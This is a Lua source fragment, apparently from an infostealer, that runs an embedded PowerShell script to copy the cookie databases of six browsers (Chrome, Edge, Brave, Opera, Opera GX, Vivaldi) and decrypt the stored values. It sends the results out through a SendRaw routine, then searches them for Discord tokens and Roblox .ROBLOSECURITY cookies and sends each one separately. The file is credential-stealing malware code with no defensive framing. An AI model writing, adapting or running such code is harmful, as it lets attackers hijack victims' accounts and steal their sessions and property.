-- Extract specific data from cookies (Discord tokens, Roblox cookie, etc)
local function ExtractSpecificCookies()
    local ps = [[
        Add-Type -AssemblyName System.Security
        $results = @()
        
        $browsers = @(
            @{Name="Chrome";  Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"},
            @{Name="Edge";    Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"},
            @{Name="Brave";   Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies"},
            @{Name="Opera";   Path="$env:APPDATA\Opera Software\Opera Stable\Cookies"},
            @{Name="OperaGX"; Path="$env:APPDATA\Opera Software\Opera GX Stable\Cookies"},
            @{Name="Vivaldi"; Path="$env:LOCALAPPDATA\Vivaldi\User Data\Default\Cookies"}
        )
        
        foreach ($b in $browsers) {
            if (Test-Path $b.Path) {
                try {
                    $db = $b.Path + "._ex"
                    Copy-Item $b.Path $db -Force
                    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$db;Version=3;Read Only=True;")
                    $conn.Open()
                    $cmd = $conn.CreateCommand()
                    $cmd.CommandText = "SELECT host_key, name, encrypted_value FROM cookies"
                    $reader = $cmd.ExecuteReader()
                    while ($reader.Read()) {
                        $host = $reader["host_key"]
                        $name = $reader["name"]
                        $val = $reader["encrypted_value"]
                        if ($val -and $val.Length -gt 0) {
                            try {
                                $bytes = [System.Security.Cryptography.ProtectedData]::Unprotect($val, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                                $plain = [System.Text.Encoding]::ASCII.GetString($bytes)
                                if ($plain.Length -gt 5) {
                                    $results += "$($b.Name) | $host | $name | $plain"
                                }
                            } catch {}
                        }
                    }
                    $conn.Close()
                    Remove-Item $db -Force -ErrorAction SilentlyContinue
                } catch {}
            }
        }
        $results | Out-String
    ]]
    
    local result = RunPS(ps)
    if result and result ~= "" then
        SendRaw(result, "Decrypted Cookies (All Browsers)")
        
        -- Auto-find Discord tokens
        for line in result:gmatch("[^\n]+") do
            if line:find("discord") or line:find("discordapp") then
                for token in line:gmatch("[^|]+$") do
                    local t = token:match("^%s*(.-)%s*$")
                    if t and #t > 20 then
                        SendRaw(t, "🎯 Discord Token Found")
                    end
                end
            end
            if line:find("ROBLOSECURITY") then
                for cookie in line:gmatch("[^|]+$") do
                    local c = cookie:match("^%s*(.-)%s*$")
                    if c and #c > 20 then
                        SendRaw(c, "🎯 Roblox Cookie Found")
                    end
                end
            end
        end
    end
end

